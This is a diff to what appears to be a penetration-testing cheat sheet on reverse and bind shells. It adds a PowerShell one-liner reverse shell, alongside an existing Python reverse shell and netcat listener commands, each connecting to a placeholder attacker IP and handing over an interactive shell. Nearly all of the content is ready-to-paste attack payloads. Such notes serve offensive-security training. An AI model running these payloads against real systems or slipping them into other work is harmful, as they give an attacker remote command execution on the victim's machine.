@@ -49,6 +49,10 @@ Victim connnects and attacker listens. Used 95% of the time.
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
+- powershell
+	- attacker runs: `nc -nlvp 443`
+	- victim runs on cmd prompt: ```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-ADDRESS',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```
+	-  
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
 
